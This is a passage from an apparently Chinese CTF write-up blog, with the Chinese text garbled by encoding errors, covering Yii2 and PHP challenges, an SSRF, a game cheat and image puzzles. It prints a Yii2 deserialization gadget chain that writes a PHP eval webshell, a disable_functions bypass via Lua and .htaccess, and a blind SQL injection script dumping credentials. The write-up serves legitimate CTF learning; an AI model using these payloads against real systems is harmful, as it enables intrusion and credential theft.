ä¸­æ‰¾åˆ° ICQ_FLAGã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eb06d4ad-87aa-4e6f-b874-dcb33edaefde&#125;</span><br></pre></td></tr></table></figure><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p><code>/www.zip</code> å­˜åœ¨æºç æ³„éœ²ï¼Œä½¿ç”¨ wget æŒ‡ä»¤æ·»åŠ  <code>-t0</code> å‚æ•°æ¥ä¸‹è½½ï¼ˆtry 123 æ‰ä¸‹å¥½å°±ç¦»è°±ï¼‰ã€‚æ‹¿ä¸‹æ¡†æ¶ä»£ç åå¯ä»¥å‘ç°åœ¨ <code>controllers/SiteController.php</code> ä¸‹å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionAbout</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&#x27;Hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = base64_decode(<span class="variable">$message</span>);</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤åªéœ€è¦æ‰¾ä¸€ä¸ªååºåˆ—åŒ–é“¾æ‰§è¡Œå³å¯ã€‚åœ¨ <code>vendor/yiisoft/yii2/rest/CreateAction.php</code> ä¸‹å¯ä»¥æ‰¾åˆ° <code>run()</code> æ–¹æ³•ä¸‹çš„ä¸€ä¸ªåˆ©ç”¨ç‚¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess)&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> å› æ­¤è¿™éƒ¨åˆ†åªéœ€è¦å¦‚æ­¤æ„é€ å³å¯å†™å…¥ shellã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Yii</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CreateAction</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;file_put_contents(\&quot;php://filter/write=convert.base64-decode/resource=shell.php\&quot;,\&quot;PD9waHAgZXZhbCgkX0dFVFsiaDN4Il0pOyBwaHBpbmZvKCk7ID8+\&quot;)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åªéœ€è¦æ‰¾ä¸€ä¸ªæ„é€ ä¸€ä¸ªå¯ä»¥è§¦å‘åˆ°ä¸Šè¿°æ–¹æ³•çš„ç±»å³å¯ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ° <code>vendor/fzaninotto/faker/src/Faker/Generator.php</code> ä¸‹çš„ <code>format()</code> æ–¹æ³•ä¸­å«æœ‰ä¸€ä¸ª <code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>ï¼Œè€Œ <code>format()</code> æ–¹æ³•å¯ä»¥ç”± <code>__call</code> è§¦å‘åˆ°ï¼Œå› æ­¤åªéœ€è¦æ‰¾ä¸€ä¸ªå¯¹å…¶è°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•çš„ç±»å³å¯ã€‚è¿™éƒ¨åˆ†å¯ä»¥å¦‚æ­¤æ„é€ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code> ä¸‹å¯ä»¥æ‰¾åˆ° <code>__destruct()</code> è°ƒç”¨åˆ°äº†ç±»ä¸­çš„ <code>reset()</code> æ–¹æ³•ï¼Œè€Œå…¶ä¸­åŒ…å«äº†å¯¹å¯æ§å‚æ•° <code>$this-&gt;_dataReader</code> çš„ <code>close()</code> æ–¹æ³•çš„è°ƒç”¨ã€‚å› æ­¤æ„é€ å‡ºå¦‚ä¸‹ä»£ç æ¥æ»¡è¶³åˆ©ç”¨æ¡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªéœ€è¦å°†ä¸Šè¿°ä»£ç åˆèµ·æ¥å¹¶ç”Ÿæˆè½½è·å³å¯å†™å…¥ shellã€‚è®¿é—® shell å¯ä»¥åœ¨ phpinfo ä¸­æ‰¾åˆ°å¦‚ä¸‹ disable_functionsã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return</span><br></pre></td></tr></table></figure><p>åç»­çš„æ­¥éª¤å¯ä»¥ä¸Šä¼ ä¸€ä¸ª lua è„šæœ¬æ¥è¯»å– flagã€‚è¿™é‡Œæ‘˜å½•ä¸€ä¸‹ <a href="https://harvey.plus/">@Harvey</a> å¸ˆå‚…çš„ lua è„šæœ¬ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">     This is the default method name for Lua handlers, see the optional</span></span><br><span class="line"><span class="comment">     function-name in the LuaMapHandler directive to choose a different</span></span><br><span class="line"><span class="comment">     entry point.</span></span><br><span class="line"><span class="comment">--]]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(r)</span></span></span><br><span class="line">    r.content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    r:puts(<span class="string">&quot;Hello Lua World!\n&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&#x27;/readflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    <span class="keyword">if</span> r.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>( r:parseargs() ) <span class="keyword">do</span></span><br><span class="line">            r:puts( <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s: %s\n&quot;</span>, k, v) )</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r:puts(<span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>åªéœ€è¦å†å†™å…¥ .htaccess ä½¿ä¸Šä¼ çš„ lua è„šæœ¬å¾—ä»¥æ‰§è¡Œå³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p><code>image.php</code> çš„ GET å‚æ•° id å­˜åœ¨ SQL æ³¨å…¥ç‚¹ï¼Œé€»è¾‘æ˜¯ <code>/image.php?id=null/**/or(1=0)#</code>ï¼Œå°è¯•ä½¿ç”¨ç›²æ³¨æ¥è·å–ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://HOST/image.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    keywords = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># sql = f&quot;null/**/or(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)/**/where/**/table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;  # images,users</span></span><br><span class="line">            <span class="comment"># sql = f&quot;null/**/or(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)/**/where/**/table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;  # id,path,username,password</span></span><br><span class="line">            sql = <span class="string">f&quot;null/**/or(ascii(substr((select/**/group_concat(username,&#x27;:&#x27;,password)from(users)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span>  <span class="comment"># admin:c6caf56650e4f2915da6c</span></span><br><span class="line">            payload = <span class="string">f&quot;?id=&quot;</span> + sql</span><br><span class="line">            r = session.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.content) != <span class="number">50811</span>:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        mid_num = <span class="built_in">int</span>((high + low + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        text += <span class="built_in">chr</span>(mid_num)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç™»å½•ä¸Šå»ä¹‹åç›´æ¥æäº¤ <code>file:///flag</code> è¿›è¡Œ SSRFï¼Œå³å¯å¾—åˆ°å¦‚ä¸‹å›æ˜¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0fc00d3d-b304-46b8-98d0-34dd512d658b/1620572577955/20f2af3dc79a6d1fc1aa72942873ee5fb6627b97.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f56d321d-50d8-4d4e-816e-621ce8c89806&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>010 editor æ‰“å¼€é™„ä»¶ï¼Œä½¿ç”¨ EBCDIC çš„ç¼–è¾‘æ–¹å¼å³å¯çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0fc00d3d-b304-46b8-98d0-34dd512d658b/1621149525356/86d9609c8a25236439160579bb767ed990ea9619.png"></p><h3 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h3><p>ä»¥é™„ä»¶ä¸­çš„ data1 çš„å†…å®¹ä¸ºåƒç´ ç‚¹ï¼Œä»¥ data2 çš„å†…å®¹ä¸ºåƒç´ ç‚¹æ‰€åœ¨ä½ç½®ï¼Œç¼–å†™è„šæœ¬å°†å›¾ç‰‡ç”»å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">data1 = <span class="built_in">open</span>(<span class="string">&quot;data1&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">data2 = <span class="built_in">open</span>(<span class="string">&quot;data2&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">pixels = [(data2[x], data2[x + <span class="number">1</span>], data2[x + <span class="number">2</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data2) // <span class="number">3</span>, <span class="number">3</span>)]</span><br><span class="line">pixelsInOrder = [pixels[<span class="built_in">int</span>(x)] <span class="keyword">for</span> x <span class="keyword">in</span> data1[:-<span class="number">1</span>]]</span><br><span class="line">image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">37</span>, <span class="number">191</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">[image.putpixel((y, x), pixelsInOrder[x + y * <span class="number">191</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">191</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>)]</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&quot;this.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0fc00d3d-b304-46b8-98d0-34dd512d658b/1620581893491/991f7765293e9751a982658c01d8eceb30b0bc56.png"></p><p>ä½¿ç”¨ npiet æ‰§è¡Œä¸Šå›¾å¹¶å°†å¾—åˆ°çš„è¾“å‡ºåŒ…ä¸Š flag æ ¼å¼å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;88842f20-fb8c-45c9-ae8f-36135b6a0f11&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è“å¸½æ¯ 2021</title>
      <link href="/zh-CN/posts/e43fbefd.html"/>
      <url>/zh-CN/posts/e43fbefd.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h3><p>egret å¼•æ“å¼€å‘çš„å°æ¸¸æˆï¼Œä¸»è¦çš„ä»£ç éƒ½åœ¨ Games.js ä¸­ã€‚ä¸»è¦çš„ç©æ³•æ˜¯æ“ä½œå°çƒæ»‘åŠ¨èº²é¿æ ‘å¹¶æ”¶é›†å¯¹åº”å·¦ä¸Šè§’å•è¯ç¼ºå¤±çš„å­—æ¯ã€‚å°† Games.js ä¸‹è½½ä¸‹æ¥åæ ¼å¼åŒ–ï¼Œå¯ä»¥å‘ç°åœ¨<code>hitWordLetter()</code> æ–¹æ³•ä¸‹æœ‰å¦‚ä¸‹é€»è¾‘ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>._score === <span class="number">60</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.gameOverFunc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯åªè¦åˆ†æ•°è¾¾åˆ°å…­ååˆ†å³å¯è·èƒœï¼Œå®šä½åˆ° <code>gameOverFunc()</code> å¯ä»¥å‘ç°è·èƒœç»“æœæ˜¯é€šè¿‡å‘ <code>/testData</code> å‘é€ POST è¯·æ±‚ä»æœåŠ¡ç«¯è·å–çš„ï¼Œå…¶ä¸­æäº¤çš„æ•°æ®ç»“æ„å¦‚ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> datas = &#123;</span><br><span class="line"><span class="string">&#x27;balls&#x27;</span>: <span class="built_in">this</span>._balls,</span><br><span class="line"><span class="string">&#x27;trees&#x27;</span>: <span class="built_in">this</span>._trees,</span><br><span class="line"><span class="string">&#x27;words&#x27;</span>: <span class="built_in">this</span>._words,</span><br><span class="line"><span class="string">&#x27;infos&#x27;</span>: <span class="built_in">this</span>._infos</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å°† <code>gameOverFunc()</code> å¤„çš„åˆ¤æ–­æ”¹ä¸€ä¸‹ï¼Œä½¿å…¶æ— è®ºåˆ†æ•°å¤šå°‘éƒ½æäº¤æ•°æ®ï¼Œä»è€Œå¾—åˆ°å¦‚ä¸‹æäº¤æ ·ä¾‹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697838325/4f1b9e467ccf84e6a2b596cef2bfc5c88fb973d1.png"></p><p>å¯ä»¥å‘ç°æ ‘çš„ä½ç½®å’Œå•è¯çš„ä½ç½®ä»¥åŠå°çƒçš„ä½ç½®éƒ½ä¼šè¢«å®æ—¶è®°å½•ï¼Œå› æ­¤æƒ³è¦æ‰‹åŠ¨ä¼ªé€ ä¸€ä»½è®°å½•ååˆ†å›°éš¾ã€‚å®šä½åˆ° <code>addBarriers()</code> æ–¹æ³•å¯ä»¥å‘ç°æ ‘çš„åæ ‡æ˜¯éšæœºç”Ÿæˆçš„ï¼Œå› æ­¤å¯ä»¥ç¨ä½œä¿®æ”¹ä½¿æ ‘æ’æ’ç«™ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">treeBg.x = <span class="number">1</span>;</span><br><span class="line">treeBg.y = <span class="built_in">Math</span>.random() * (<span class="built_in">this</span>._stageH - <span class="number">80</span> - (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>)) + (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Fiddler æ‹¦æˆªè¯·æ±‚æ¥æ›¿æ¢ Games.jsï¼Œå³å¯è½»æ¾å®Œæˆæ¸¸æˆè®¾å®šçš„ç›®æ ‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697410922/9a61625f26a8fcbfcfd85c5661c44861ce5d0534.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f2852395-1f2b-47a6-bd29-cd54bb67a614&#125;</span><br></pre></td></tr></table></figure><h3 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h3><blockquote><p>how to change my euidï¼Ÿ</p></blockquote><h4 id="PHP-INT-MAX-å¯¼è‡´èµ‹å€¼æŠ¥é”™"><a href="#PHP-INT-MAX-å¯¼è‡´èµ‹å€¼æŠ¥é”™" class="headerlink" title="PHP_INT_MAX å¯¼è‡´èµ‹å€¼æŠ¥é”™"></a>PHP_INT_MAX å¯¼è‡´èµ‹å€¼æŠ¥é”™</h4><p>ä¸‹è½½é¢˜ç›®ç»™å‡ºçš„é™„ä»¶ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç°åˆ¤æ–­çš„è¯­å¥æ˜¯ä¸€ä¸ªèµ‹å€¼è¯­å¥ï¼Œå› æ­¤éœ€è¦å°è¯•è®©èµ‹å€¼è¯­å¥è¿”å› <code>false</code>ã€‚æ°å·§èµ‹å€¼çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå½“æ•°ç»„çš„ä¸‹æ ‡è¾¾åˆ° <code>PHP_INT_MAX</code> å³ 9223372036854775807 æ—¶å†æ¬¡ä½¿ç”¨ <code>$count[]=1</code> å¢åŠ æ–°çš„æ•°ç»„å…ƒç´ æ—¶å³ä¼šå¤±è´¥ã€‚å› æ­¤åªè¦è®© <code>$count</code> çš„å€¼ä¸º <code>PHP_INT_MAX</code> å³å¯ï¼Œæ„é€ å‡ºå¦‚ä¸‹åºåˆ—åŒ–è„šæœ¬ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span> = PHP_INT_MAX - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User);</span><br><span class="line"><span 